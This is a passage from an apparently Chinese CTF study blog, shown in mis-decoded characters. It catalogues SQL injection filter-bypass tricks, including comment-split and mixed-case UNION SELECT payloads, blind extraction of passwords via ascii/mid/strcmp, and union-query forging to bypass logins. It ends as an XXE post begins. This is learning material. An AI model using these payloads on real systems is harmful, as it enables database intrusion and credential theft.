<p>ï¼ˆï¼‰å¯ä»¥ä½œä¸ºä¸€ä¸ªå­è¯­å¥æŸ¥è¯¢å­˜åœ¨,ä»»ä½•å¯ä»¥è®¡ç®—å‡ºç»“æœçš„è¯­å¥ï¼Œéƒ½å¯ä»¥ç”¨æ‹¬å·åŒ…å›´èµ·æ¥ã€‚è€Œæ‹¬å·çš„ä¸¤ç«¯ï¼Œå¯ä»¥æ²¡æœ‰å¤šä½™çš„ç©ºæ ¼ã€‚æ‰€ä»¥å°±å¯ä»¥ç”¨()ä»£æ›¿ç©ºæ ¼</p>
<p>urlç¼–ç ç»•è¿‡<code>%0a %20 %09 %0a %0b %0c %0d %a0</code>ä»£æ›¿ã€‚</p>
<h3 id="å¼•å·ç»•è¿‡"><a href="#å¼•å·ç»•è¿‡" class="headerlink" title="å¼•å·ç»•è¿‡"></a>å¼•å·ç»•è¿‡</h3><p>ä½¿ç”¨åå…­è¿›åˆ¶æ›¿ä»£éœ€è¦ç”¨åˆ°å¼•å·çš„è¯­å¥ï¼Œä¸€èˆ¬æ˜¯åœ¨æœ€åçš„æŸ¥è¯¢è¯­å¥</p>
<h3 id="andå’Œorç»•è¿‡"><a href="#andå’Œorç»•è¿‡" class="headerlink" title="andå’Œorç»•è¿‡"></a>andå’Œorç»•è¿‡</h3><p>è€ƒè™‘ç®¡é“ç¬¦||è¡¨ç¤ºorå’Œ&amp;&amp;è¡¨ç¤ºand</p>
<h3 id="ç»•è¿‡"><a href="#ç»•è¿‡" class="headerlink" title="&#x3D;ç»•è¿‡"></a>&#x3D;ç»•è¿‡</h3><p>æ”¹æˆlikeæˆ–è€…&lt;æˆ–è€…&gt;</p>
<p>è¿˜æœ‰<code>rlike ã€regexp(æ­£åˆ™åŒ¹é…å‡½æ•°ï¼Œâ€˜â€™æ˜¯ç›´æ¥æ‰¾æˆ–åŒ…å«ï¼Œ^æ˜¯ä»¥ä»€ä¹ˆå¼€å¤´,å¯ä»¥ç”¨[a-zA-Z]æµæ°“åŒ¹é…)</code></p>
<ul>
<li>è¿™é‡Œè¯¦ç»†å°†ä¸€ä¸‹æ­£åˆ™çš„æ³¨å…¥å§ï¼Œæ„Ÿè§‰å’Œæ­£åˆ™æ²¾ä¸Šå…³ç³»çš„éƒ½è›®ä¸å½“äººçš„</li>
</ul>
<p>æ­£å¸¸çš„ä¸€ä¸ªæŸ¥è¯¢è¯­å¥å°±åƒè¿™æ ·:</p>
<pre><code class="highlight sql"><span class="keyword">select</span> password <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span><span class="number">1</span></code></pre>

<p>è¿™é‡Œå¼•ç”¨å…¶ä»–å¸ˆå‚…æ‰“å¥½çš„å®ä¾‹(<a href="https://ljdd520.github.io/2019/11/06/sql%E6%B3%A8%E5%85%A5%E7%9A%84%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/">sqlæ³¨å…¥çš„çŸ¥è¯†æ€»ç»“ | Lâ€™s Blog</a>)</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250402210544627.png" alt="image-20250402210544627"></p>
<p>å‘ƒå‘ƒï¼Œæ€ä¹ˆç†è§£å‘¢?å°±æŠŠregexpçœ‹æˆä»^å¼€å§‹å­—ç¬¦ä¸²ä¸æŸ¥è¯¢åˆ°çš„åŸä¸²è¿›è¡Œä¸€ä¸ªæ¯”è¾ƒ</p>
<h3 id="é€—å·è¿‡æ»¤"><a href="#é€—å·è¿‡æ»¤" class="headerlink" title="é€—å·è¿‡æ»¤"></a>é€—å·è¿‡æ»¤</h3><pre><code class="highlight sql"><span class="keyword">select</span> substr(database() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);
#substr(str,pos,len)çš„åŠŸèƒ½æ˜¯ä»poså¼€å§‹çš„ä½ç½®ï¼Œæˆªå–lenä¸ªå­—ç¬¦ï¼›è€Œæ— lenå°±æ˜¯ç›´æ¥æˆªå–åˆ°æœ€å
<span class="keyword">select</span> mid(database() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);
#
<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="operator">-</span><span class="operator">&gt;</span> <span class="operator">&lt;</span><span class="keyword">select</span> <span class="number">1</span><span class="operator">&gt;</span>a <span class="keyword">join</span> <span class="operator">&lt;</span><span class="keyword">select</span> <span class="number">2</span><span class="operator">&gt;</span>b <span class="keyword">join</span><span class="operator">&lt;</span><span class="keyword">select</span> <span class="number">3</span><span class="operator">&gt;</span>c <span class="keyword">join</span>
<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> ((selcet1)A <span class="keyword">join</span> (select2)B <span class="keyword">join</span>(<span class="keyword">select</span> <span class="number">3</span>)C);
limit <span class="number">0</span>,<span class="number">1</span><span class="operator">-</span><span class="operator">&gt;</span>limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span>;<span class="operator">/</span><span class="operator">/</span>ç­‰äºlimit <span class="number">0</span>,<span class="number">1</span> ä»ç¬¬<span class="number">1</span>è¡Œå¾€åå–<span class="number">0</span>è¡Œï¼Œåªè¯»ç¬¬ä¸€è¡Œ
#limit <span class="number">1</span>,<span class="number">2</span> æŒ‡çš„æ˜¯ä»ç¬¬ä¸€è¡Œå¾€åå–<span class="number">2</span>è¡Œï¼ˆåŒ…æ‹¬ç¬¬ä¸€è¡Œå’Œç¬¬äºŒè¡Œ)ï¼›è€Œlimit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">2</span>æ˜¯ä»ç¬¬ä¸€è¡Œå¼€å§‹åªå–ç¬¬äºŒè¡Œ
<span class="keyword">select</span> <span class="built_in">substring</span>(<span class="string">&#x27;hello&#x27;</span> <span class="keyword">from</span> <span class="number">1</span>);</code></pre>

<h3 id="æ¯”è¾ƒç¬¦å·-ç»•è¿‡"><a href="#æ¯”è¾ƒç¬¦å·-ç»•è¿‡" class="headerlink" title="æ¯”è¾ƒç¬¦å·(&lt; &gt;)ç»•è¿‡"></a>æ¯”è¾ƒç¬¦å·(&lt; &gt;)ç»•è¿‡</h3><p>ä¸€èˆ¬æ˜¯ç›²æ³¨è¦ç”¨åˆ°æ</p>
<p>æœ€å¸¸è§çš„ä¸€ä¸ªç›²æ³¨çš„sqlè¯­å¥ï¼š</p>
<pre><code class="highlight plaintext">select * from users where id=1 and ascii(substr(database(),0,1))&gt;64</code></pre>

<p>æ­¤æ—¶å¦‚æœæ¯”è¾ƒæ“ä½œç¬¦è¢«è¿‡æ»¤ï¼Œä¸Šé¢çš„ç›²æ³¨è¯­å¥åˆ™æ— æ³•ä½¿ç”¨,é‚£ä¹ˆå°±å¯ä»¥ä½¿ç”¨greatestæ¥ä»£æ›¿æ¯”è¾ƒæ“ä½œç¬¦äº†ã€‚greatest(n1,n2,n3,â€¦)å‡½æ•°è¿”å›è¾“å…¥å‚æ•°(n1,n2,n3,â€¦)çš„æœ€å¤§å€¼ã€‚</p>
<p>é‚£ä¹ˆä¸Šé¢çš„è¿™æ¡sqlè¯­å¥å¯ä»¥ä½¿ç”¨greatestå˜ä¸ºå¦‚ä¸‹çš„å­å¥:</p>
<pre><code class="highlight plaintext">select*fromuserswhereid=1and greatest(ascii(substr(database(),0,1)),64)=64</code></pre>

<h3 id="ç»•è¿‡å…³é”®å­—-union-selectï¼Œwhere"><a href="#ç»•è¿‡å…³é”®å­—-union-selectï¼Œwhere" class="headerlink" title="ç»•è¿‡å…³é”®å­—(union,selectï¼Œwhere)"></a>ç»•è¿‡å…³é”®å­—(union,selectï¼Œwhere)</h3><p>1ï¼‰ä½¿ç”¨æ³¨é‡Šç¬¦ç»•è¿‡ï¼š</p>
<p>å¸¸ç”¨æ³¨é‡Šç¬¦ï¼š</p>
<p><code>//ï¼Œ-- , /**/, #(urlç¼–ç ä¸€ä¸‹è¿˜èƒ½ç”¨), --+, -- -, ;,%00,--a</code></p>
<p>ç”¨æ³•ï¼š</p>
<p><code>U/**/NION/**/SE/**/LECT/**/userï¼Œpwd from user</code></p>
<p>2ï¼‰ä½¿ç”¨å¤§å°å†™ç»•è¿‡ï¼š</p>
<p><code>id=-1&#39;UnIoN/**/SeLeCT</code></p>
<p>3ï¼‰å†…è”æ³¨é‡Šç»•è¿‡ï¼š</p>
<p><code>id=-1&#39;/*!UnIoN*/SeLeCT1,2,concat(/*!table_name*/) FrOM/*information_schema*/.tables/*!WHERE*//*!TaBlE_ScHeMa*/like database()#</code></p>
<p>4ï¼‰ åŒå…³é”®å­—ç»•è¿‡ï¼š</p>
<p><code>id=-1&#39;UNIunionONSeLselectECT1,2,3â€“-</code></p>
<h3 id="é€šç”¨ç¼–ç ç»•è¿‡"><a href="#é€šç”¨ç¼–ç ç»•è¿‡" class="headerlink" title="é€šç”¨ç¼–ç ç»•è¿‡"></a>é€šç”¨ç¼–ç ç»•è¿‡</h3><p>å¦‚URLEncodeç¼–ç ï¼ŒASCII,HEX,unicodeç¼–ç ç»•è¿‡ï¼š</p>
<p>or1&#x3D;1å³%6f%72%20%31%3d%31ï¼Œè€ŒTestä¹Ÿå¯ä»¥ä¸ºCHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)</p>
<h3 id="ç­‰ä»·å‡½æ•°ç»•è¿‡"><a href="#ç­‰ä»·å‡½æ•°ç»•è¿‡" class="headerlink" title="ç­‰ä»·å‡½æ•°ç»•è¿‡"></a>ç­‰ä»·å‡½æ•°ç»•è¿‡</h3><p>hex()ã€bin()&#x3D;&#x3D;&gt;ascii()</p>
<p>sleep()&#x3D;&#x3D;&gt;benchmark()</p>
<p>concat_ws()&#x3D;&#x3D;&gt;group_concat()</p>
<p>mid()ã€substr()&#x3D;&#x3D;&gt;substring() @@user&#x3D;&#x3D;&gt;user() @@datadir&#x3D;&#x3D;&gt;datadir()</p>
<p>ä¸¾ä¾‹ï¼šsubstring()å’Œsubstr()æ— æ³•ä½¿ç”¨æ—¶ï¼š?id&#x3D;1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))&#x3D;74æˆ–è€…ï¼š</p>
<p>substr((selectâ€™passwordâ€™),1,1)&#x3D;0x70strcmp(left(â€˜passwordâ€™,1),0x69)&#x3D;1strcmp(left(â€˜passwordâ€™,1),0x70)&#x3D;0strcmp(left(â€˜passwordâ€™,1),0x71)&#x3D;-1</p>
<h3 id="é•¿åº¦é™åˆ¶ç»•è¿‡"><a href="#é•¿åº¦é™åˆ¶ç»•è¿‡" class="headerlink" title="é•¿åº¦é™åˆ¶ç»•è¿‡"></a>é•¿åº¦é™åˆ¶ç»•è¿‡</h3><p>ç½‘é¡µæ˜¾ç¤ºå¸¸å¸¸åªèƒ½ç»™å‡ºæœ‰é™é•¿åº¦çš„å­—æ¯ï¼Œè¿™ä¸ªæ—¶å€™å°±è¦é€šè¿‡ä¸€äº›å‡½æ•°æ¥ç»•è¿‡</p>
<pre><code class="highlight sql"><span class="number">1</span>ã€<span class="keyword">left</span>ï¼ˆ<span class="number">201809</span>,<span class="number">4</span>ï¼‰æˆªå–å·¦è¾¹çš„<span class="number">4</span>ä¸ªå­—ç¬¦
<span class="keyword">SELECT</span> <span class="keyword">LEFT</span>(<span class="number">201809</span>,<span class="number">4</span>)    <span class="operator">/</span><span class="operator">/</span>ç»“æœï¼š<span class="number">2018</span>

<span class="number">2</span>ã€<span class="keyword">right</span>ï¼ˆname,<span class="number">2</span>ï¼‰æˆªå–å³è¾¹çš„<span class="number">2</span>ä¸ªå­—ç¬¦
<span class="keyword">SELECT</span> <span class="keyword">RIGHT</span>(<span class="number">201809</span>,<span class="number">2</span>)    <span class="operator">/</span><span class="operator">/</span>ç»“æœï¼š<span class="number">09</span>

<span class="number">3</span>ã€<span class="built_in">SUBSTRING</span>(name,<span class="number">5</span>,<span class="number">3</span>) æˆªå–nameè¿™ä¸ªå­—æ®µ ä»ç¬¬äº”ä¸ªå­—ç¬¦å¼€å§‹ åªæˆªå–ä¹‹åçš„<span class="number">3</span>ä¸ªå­—ç¬¦
<span class="keyword">SELECT</span> <span class="built_in">SUBSTRING</span>(<span class="string">&#x27;æˆéƒ½èèµ„äº‹ä¸šéƒ¨&#x27;</span>,<span class="number">5</span>,<span class="number">3</span>)   <span class="operator">/</span><span class="operator">/</span>ç»“æœï¼šäº‹ä¸šéƒ¨

<span class="number">4</span>ã€<span class="built_in">SUBSTRING</span>(name,<span class="number">3</span>) æˆªå–nameè¿™ä¸ªå­—æ®µ ä»ç¬¬ä¸‰ä¸ªå­—ç¬¦å¼€å§‹ï¼Œä¹‹åçš„æ‰€æœ‰ä¸ªå­—ç¬¦
<span class="keyword">SELECT</span> <span class="built_in">SUBSTRING</span>(<span class="string">&#x27;æˆéƒ½èèµ„äº‹ä¸šéƒ¨&#x27;</span>,<span class="number">3</span>)   <span class="operator">/</span><span class="operator">/</span>ç»“æœï¼šèèµ„äº‹ä¸šéƒ¨

<span class="number">5</span>ã€<span class="built_in">SUBSTRING</span>(name, <span class="number">-4</span>) æˆªå–nameè¿™ä¸ªå­—æ®µçš„ç¬¬ <span class="number">4</span> ä¸ªå­—ç¬¦ä½ç½®ï¼ˆå€’æ•°ï¼‰å¼€å§‹å–ï¼Œç›´åˆ°ç»“æŸ
<span class="keyword">SELECT</span> <span class="built_in">SUBSTRING</span>(<span class="string">&#x27;æˆéƒ½èèµ„äº‹ä¸šéƒ¨&#x27;</span>,<span class="number">-4</span>)   <span class="operator">/</span><span class="operator">/</span>ç»“æœï¼šèµ„äº‹ä¸šéƒ¨

<span class="number">6</span>ã€<span class="built_in">SUBSTRING</span>(name, <span class="number">-4</span>ï¼Œ<span class="number">2</span>) æˆªå–nameè¿™ä¸ªå­—æ®µçš„ç¬¬ <span class="number">4</span> ä¸ªå­—ç¬¦ä½ç½®ï¼ˆå€’æ•°ï¼‰å¼€å§‹å–ï¼Œåªæˆªå–ä¹‹åçš„<span class="number">2</span>ä¸ªå­—ç¬¦
<span class="keyword">SELECT</span> <span class="built_in">SUBSTRING</span>(<span class="string">&#x27;æˆéƒ½èèµ„äº‹ä¸šéƒ¨&#x27;</span>,<span class="number">-4</span>,<span class="number">2</span>)   <span class="operator">/</span><span class="operator">/</span>ç»“æœï¼šèµ„äº‹
æ³¨æ„ï¼šæˆ‘ä»¬æ³¨æ„åˆ°åœ¨å‡½æ•° <span class="built_in">substring</span>(str,pos, len)ä¸­ï¼Œ pos å¯ä»¥æ˜¯è´Ÿå€¼ï¼Œä½† len ä¸èƒ½å–è´Ÿå€¼ã€‚

<span class="number">7</span>ã€substring_index(<span class="string">&#x27;www.baidu.com&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="number">2</span>) æˆªå–ç¬¬äºŒä¸ª <span class="string">&#x27;.&#x27;</span> ä¹‹å‰çš„æ‰€æœ‰å­—ç¬¦
<span class="keyword">SELECT</span> substring_index(<span class="string">&#x27;www.baidu.com&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="number">2</span>)   <span class="operator">/</span><span class="operator">/</span>ç»“æœï¼šwww.baidu

<span class="number">8</span>ã€substring_index(<span class="string">&#x27;www.baidu.com&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="number">-2</span>) æˆªå–ç¬¬äºŒä¸ª <span class="string">&#x27;.&#x27;</span> ï¼ˆå€’æ•°ï¼‰ä¹‹åçš„æ‰€æœ‰å­—ç¬¦
<span class="keyword">SELECT</span> substring_index(<span class="string">&#x27;www.baidu.com&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="number">-2</span>)   <span class="operator">/</span><span class="operator">/</span>ç»“æœï¼šbaidu.com

<span class="number">9</span>ã€SUBSTR(name, <span class="number">1</span>, <span class="keyword">CHAR_LENGTH</span>(name)<span class="number">-3</span>) æˆªå–nameå­—æ®µï¼Œå–é™¤nameå­—æ®µåä¸‰ä½çš„æ‰€æœ‰å­—ç¬¦
<span class="keyword">SELECT</span> SUBSTR(<span class="string">&#x27;æˆéƒ½èèµ„äº‹ä¸šéƒ¨&#x27;</span>, <span class="number">1</span>, <span class="keyword">CHAR_LENGTH</span>(<span class="string">&#x27;æˆéƒ½èèµ„äº‹ä¸šéƒ¨&#x27;</span>)<span class="number">-3</span>)            <span class="operator">/</span><span class="operator">/</span>ç»“æœï¼šæˆéƒ½èèµ„

<span class="number">10</span>ã€mid(str,<span class="keyword">start</span>,[length])
str:æˆªå–çš„å­—ç¬¦ä¸²   <span class="keyword">start</span>:èµ·å§‹ä½ç½®   length:æˆªå–çš„é•¿åº¦ï¼Œå¯ä»¥å¿½ç•¥
è¿˜å¯ä»¥è¿™ä¹ˆæ„é€ :mid((str)<span class="keyword">from</span>(i)<span class="keyword">for</span>(<span class="number">1</span>)) #<span class="keyword">from</span>(<span class="number">1</span>)è¡¨ç¤ºä»ç¬¬ä¸€ä¸ªä½ç½®å¼€å§‹æˆªå–å‰©ä¸‹çš„å­—ç¬¦ä¸²ï¼Œ<span class="keyword">for</span>(<span class="number">1</span>)è¡¨ç¤ºä»æ”¹ä½ç½®èµ·ä¸€æ¬¡å°±æˆªå–ä¸€ä¸ªå­—ç¬¦

<span class="number">11.</span>reverse(concat(<span class="number">0x3a</span>ï¼Œ(<span class="keyword">select</span>(group_concat(real_flag_1s_here))<span class="keyword">from</span>(users)<span class="keyword">where</span>(real_flag_1s_here)regexp(<span class="string">&#x27;^f&#x27;</span>))))
ç”¨reverseå€’åºè¾“å‡ºï¼Œæœ‰æ—¶å€™æœ‰å¥‡æ•ˆã€‚?å¤§æ¦‚å§
</code></pre>



<h2 id="Episode-6-æ¨¡ç³ŠåŒ¹é…"><a href="#Episode-6-æ¨¡ç³ŠåŒ¹é…" class="headerlink" title="Episode 6  æ¨¡ç³ŠåŒ¹é…"></a>Episode 6  æ¨¡ç³ŠåŒ¹é…</h2><p>SQLæ¨¡ç³ŠæŸ¥è¯¢ï¼Œä½¿ç”¨likeæ¯”è¾ƒå…³é”®å­—ï¼ŒåŠ ä¸ŠSQLé‡Œçš„é€šé…ç¬¦ï¼Œè¯·å‚è€ƒä»¥ä¸‹ï¼š</p>
<p>1ã€LIKEâ€™Mc%â€™ å°†æœç´¢ä»¥å­—æ¯ Mc å¼€å¤´çš„æ‰€æœ‰å­—ç¬¦ä¸²ï¼ˆå¦‚ McBaddenï¼‰ã€‚</p>
<p>2ã€LIKEâ€™%ingerâ€™ å°†æœç´¢ä»¥å­—æ¯ inger ç»“å°¾çš„æ‰€æœ‰å­—ç¬¦ä¸²ï¼ˆå¦‚ Ringerã€Stringerï¼‰</p>
<p>3ã€LIKEâ€™%en%â€™ å°†æœç´¢åœ¨ä»»ä½•ä½ç½®åŒ…å«å­—æ¯ en çš„æ‰€æœ‰å­—ç¬¦ä¸²ï¼ˆå¦‚ Bennetã€Greenã€McBaddenï¼‰ã€‚</p>
<p>4ã€LIKEâ€™_herylâ€™ å°†æœç´¢ä»¥å­—æ¯ heryl ç»“å°¾çš„æ‰€æœ‰å…­ä¸ªå­—æ¯çš„åç§°ï¼ˆå¦‚ Cherylã€Sherylï¼‰ã€‚</p>
<p>5ã€LIKEâ€™[CK]ars[eo]nâ€™ å°†æœç´¢ä¸‹åˆ—å­—ç¬¦ä¸²ï¼šCarsenã€Karsenã€Carson å’Œ Karsonï¼ˆå¦‚ Carsonï¼‰ã€‚</p>
<p>6ã€LIKEâ€™[M-Z]ingerâ€™ å°†æœç´¢ä»¥å­—ç¬¦ä¸² inger ç»“å°¾ã€ä»¥ä» M åˆ° Z çš„ä»»ä½•å•ä¸ªå­—æ¯å¼€å¤´çš„æ‰€æœ‰åç§°ï¼ˆå¦‚ Ringerï¼‰ã€‚</p>
<p>7ã€LIKEâ€™M[^c]%â€™ å°†æœç´¢ä»¥å­—æ¯ M å¼€å¤´ï¼Œå¹¶ä¸”ç¬¬äºŒä¸ªå­—æ¯ä¸æ˜¯ c çš„æ‰€æœ‰åç§°ï¼ˆå¦‚MacFeatherï¼‰ã€‚</p>
<h2 id="Episode-7-å¥‡å¥‡æ€ªæ€ªçš„çŸ¥è¯†ç‚¹å’Œä¸€äº›æŠ€å·§ç§¯ç´¯"><a href="#Episode-7-å¥‡å¥‡æ€ªæ€ªçš„çŸ¥è¯†ç‚¹å’Œä¸€äº›æŠ€å·§ç§¯ç´¯" class="headerlink" title="Episode   7 å¥‡å¥‡æ€ªæ€ªçš„çŸ¥è¯†ç‚¹å’Œä¸€äº›æŠ€å·§ç§¯ç´¯"></a>Episode   7 å¥‡å¥‡æ€ªæ€ªçš„çŸ¥è¯†ç‚¹å’Œä¸€äº›æŠ€å·§ç§¯ç´¯</h2><h3 id="çŸ­è·¯ç®—æ³•ï¼š"><a href="#çŸ­è·¯ç®—æ³•ï¼š" class="headerlink" title="çŸ­è·¯ç®—æ³•ï¼š"></a><strong>çŸ­è·¯ç®—æ³•ï¼š</strong></h3><p>|| é€»è¾‘æˆ–çš„çŸ­è·¯ï¼ša||b</p>
<p>è®¡ç®—æœºå‘ç°aæ˜¯çœŸï¼Œé‚£ä¹ˆè¾“å‡ºaï¼›å¦‚æœaæ˜¯å‡ï¼Œé‚£ä¹ˆè¾“å‡ºb</p>
<p>select 1 from ï¼šå»ºç«‹ä¸€ä¸ªä¸´æ—¶åˆ—ï¼Œè¿™ä¸ªåˆ—çš„æ‰€æœ‰åˆå§‹å€¼éƒ½è¢«è®¾ä¸º1ã€‚å¦‚æœå‘ç°selectåé¢è·Ÿæœ‰||å°±å¯ä»¥æ„é€ 1 ||(sqlè¯­å¥) ç”¨æ¥æ— æ•ˆåŒ–åæ–¹è¯­å¥ã€‚</p>
<h3 id="WITH-ROLLUP-æ¥è‡ªctfshow-web10"><a href="#WITH-ROLLUP-æ¥è‡ªctfshow-web10" class="headerlink" title="WITH ROLLUP:(æ¥è‡ªctfshow web10)"></a><strong>WITH ROLLUP:</strong>(æ¥è‡ªctfshow web10)</h3><pre><code class="highlight plaintext">è¯­æ³•:group by xxx with rollup</code></pre>

<p>with rollupæ˜¯å¯¹å‰é¢æ•°æ®çš„ä¸€æ¬¡æ±‡æ€»ï¼Œæ­¤æ—¶åœ¨æŸ¥è¯¢çš„æ•°æ®ä¸­ä¼šè¢«æ’å…¥ä¸€è¡Œå€¼ä¸ºNULL,æ­¤æ—¶å³å¯ç»•è¿‡é•¿åº¦æ£€éªŒï¼Œå‰æä½ è¦çŸ¥é“åœ¨å“ªä¸ªè¡¨å¹¶ä¸”æ²¡æœ‰å¯¹ç¬¬äºŒä¸ªå­—æ®µæ˜¯å¦è¾“å…¥çš„å‰ç«¯æ£€æŸ¥</p>
<h3 id="è”åˆæŸ¥è¯¢ä¼ªé€ "><a href="#è”åˆæŸ¥è¯¢ä¼ªé€ " class="headerlink" title="è”åˆæŸ¥è¯¢ä¼ªé€ "></a><strong>è”åˆæŸ¥è¯¢ä¼ªé€ </strong></h3><p>é€šè¿‡è”åˆæŸ¥è¯¢ï¼Œä½ å¯ä»¥ä¼ªé€ ä¸€æ®µæ²¡æœ‰çš„æ•°æ®(å³ä¸´æ—¶æ•°æ®)</p>
<p>å› ä¸ºunion selectä¼šæŠŠæŸ¥è¯¢ç»“æœæ¥åœ¨å‰ä¸€ä¸ªæŸ¥è¯¢ç»“æœåé¢ï¼Œå‰é¢å¦‚æœæŸ¥åˆ°äº†ä¸œè¥¿ï¼Œé‚£ä¹ˆå–å¾—è¿˜æ˜¯ç¬¬ä¸€è¡Œ</p>
<p>é‚£ä¹ˆé€šè¿‡è®©å‰é¢æŸ¥ä¸åˆ°ï¼Œå›æ˜¾æˆ‘ä»¬çš„æ³¨å…¥è¯­å¥å°±èƒ½å¤Ÿè¾¾åˆ°æ³¨å…¥ç›®çš„(å‘ƒå‘ƒï¼Œæ„Ÿè§‰æœ‰ç‚¹åƒäºŒæ¬¡æ³¨å…¥çš„åé¢åŠæ®µ)</p>
<p>è¿™é‡Œç›´æ¥åº”ç”¨åˆ«çš„å¸ˆå‚…æ‰“å¥½çš„æ¡ˆä¾‹</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250330124245041.png" alt="image-20250330124245041"></p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250330124258559.png" alt="image-20250330124258559"></p>
<p>é‚£ä¹ˆåªè¦çŸ¥é“usernameæ‰€åœ¨çš„åˆ—å°±å¯ä»¥ç›´æ¥ç³Šå¼„è¿‡å¯†ç çš„æ£€æµ‹äº†</p>
<h3 id="æ³¨é‡Šå’Œéæ³¨é‡Šé—­åˆ"><a href="#æ³¨é‡Šå’Œéæ³¨é‡Šé—­åˆ" class="headerlink" title="æ³¨é‡Šå’Œéæ³¨é‡Šé—­åˆ"></a>æ³¨é‡Šå’Œéæ³¨é‡Šé—­åˆ</h3><p>ä¼—æ‰€å‘¨çŸ¥ï¼Œ<code># --+</code>æ˜¯ä¸ºäº†æ³¨é‡Šæ‰åé¢çš„â€™</p>
<p>é‚£æˆ‘é—®ä½ ï¼Œå¦‚æœæ³¨é‡Šç¬¦å…¨è¢«è¿‡æ»¤äº†å‘¢</p>
<p>è¯¶ï¼Œé‚£å°±ç”¨åˆ°éæ³¨é‡Šé—­åˆï¼Œå°±æ˜¯åœ¨payloadæœ€åæŠŠâ€“+è¿™äº›æ¢æˆand â€˜1â€™&#x3D;â€™1</p>
<p>æ¥è¾¾åˆ°æ­£å¸¸æ³¨å…¥ä¸æŠ¥é”™çš„ç›®çš„</p>
<h2 id="Episode-8-ä¸€ç‚¹æ„Ÿæƒ³"><a href="#Episode-8-ä¸€ç‚¹æ„Ÿæƒ³" class="headerlink" title="Episode   8 ä¸€ç‚¹æ„Ÿæƒ³"></a>Episode   8 ä¸€ç‚¹æ„Ÿæƒ³</h2><p>åˆ·äº†ä¸€äº›é¢˜ç›®ï¼Œå‘ç°æœ€é‡è¦çš„å…¶å®æ˜¯æ³¨å…¥ç‚¹çš„åˆ¤æ–­(é™¤éæ˜¯ä¸‡æ¶çš„ç›²æ³¨ï¼Œé‚£é‡ç‚¹å¯èƒ½æ›´åœ¨è„šæœ¬ä¸Š)</p>
<p>[å‚è€ƒæ–‡ç« ]: <a href="https://www.cnblogs.com/ECJTUACM-873284962/p/8977983.html">https://www.cnblogs.com/ECJTUACM-873284962/p/8977983.html</a>	â€œåŸºäºçº¦æŸçš„SQLæ”»å‡» - Angel_Kitty - åšå®¢å›­â€<br>[å‚è€ƒæ–‡ç« ]: <a href="https://www.cnblogs.com/icui4cu/p/15136893.html">https://www.cnblogs.com/icui4cu/p/15136893.html</a>	â€œå®½å­—èŠ‚æ³¨å…¥åŸç†åŠç»•è¿‡æ–¹å¼â€</p>
]]></content>
      <tags>
        <tag>-web -CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>åˆè§XXE</title>
    <url>/2025/04/28/%E5%88%9D%E8%A7%81XXE/</url>
    <content><![CDATA[<h1 id="åˆè§XXE"><a href="#åˆè§XXE" class="headerlink" title="åˆè§XXE"></a>åˆè§XXE</h1><p>è¿™æ˜¯ä»€ä¹ˆ?XXEï¼Œæ³¨ä¸€ä¸‹ã€‚è¿™æ˜¯ä»€ä¹ˆ?XXEï¼Œæ³¨ä¸€ä¸‹ã€‚è¿™æ˜¯ä»€ä¹ˆ?XXEï¼Œæ³¨ä¸€ä¸‹ã€‚è¿™æ˜¯ä»€ä¹ˆ?XXEï¼Œæ³¨ä¸€ä¸‹ã€‚è¿™æ˜¯ä»€ä¹ˆ?XXEï¼Œæ³¨ä¸€ä¸‹ã€‚è¿™æ˜¯ä»€ä¹ˆ?XXEï¼Œæ³¨ä¸€ä¸‹ã€‚è¿™æ˜¯ä»€ä¹ˆ?XXEï¼Œæ³¨ä¸€ä¸‹ã€‚è¿™æ˜¯ä»€ä¹ˆ?XXEï¼Œæ³¨ä¸€ä¸‹ã€‚è¿™æ˜¯ä»€ä¹ˆ?XXEï¼Œæ³¨ä¸€ä¸‹ã€‚è¿™æ˜¯ä»€ä¹ˆ?XXEï¼Œæ³¨ä¸€ä¸‹ã€‚</p>
<h2 id="ä»€ä¹ˆæ˜¯XMLå‘¢"><a href="#ä»€ä¹ˆæ˜¯XMLå‘¢" class="headerlink" title="ä»€ä¹ˆæ˜¯XMLå‘¢"></a>ä»€ä¹ˆæ˜¯XMLå‘¢</h2><p>XMLï¼Œå…¨ç§°<strong>å¯æ‰©å±•æ ‡è®°è¯­è¨€</strong>ï¼ŒXMLæ˜¯ä¸€ç§ç”¨äºå­˜å‚¨å’Œä¼ è¾“æ•°æ®çš„è¯­è¨€ã€‚ä¸HTMLä¸€æ ·ï¼ŒXMLä½¿ç”¨æ ‡ç­¾å’Œæ•°æ®çš„æ ‘çŠ¶ç»“æ„ã€‚ä½†ä¸åŒçš„æ˜¯ï¼ŒXMLä¸ä½¿ç”¨é¢„å®šä¹‰æ ‡è®°ï¼Œå› æ­¤å¯ä»¥ä¸ºæ ‡è®°æŒ‡å®šæè¿°æ•°æ®çš„åç§°ã€‚ç”±äºjsonçš„å‡ºç°ï¼Œxmlçš„å—æ¬¢è¿ç¨‹åº¦å¤§å¤§ä¸‹é™ã€‚</p>
<p>XMLæ–‡æ¡£ç»“æ„åŒ…æ‹¬XMLå£°æ˜+DTDæ–‡æ¡£ç±»å‹å®šä¹‰+æ–‡æ¡£å…ƒç´ </p>
<pre><code class="highlight plaintext">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;&lt;!--xmlæ–‡ä»¶çš„å£°æ˜--&gt;
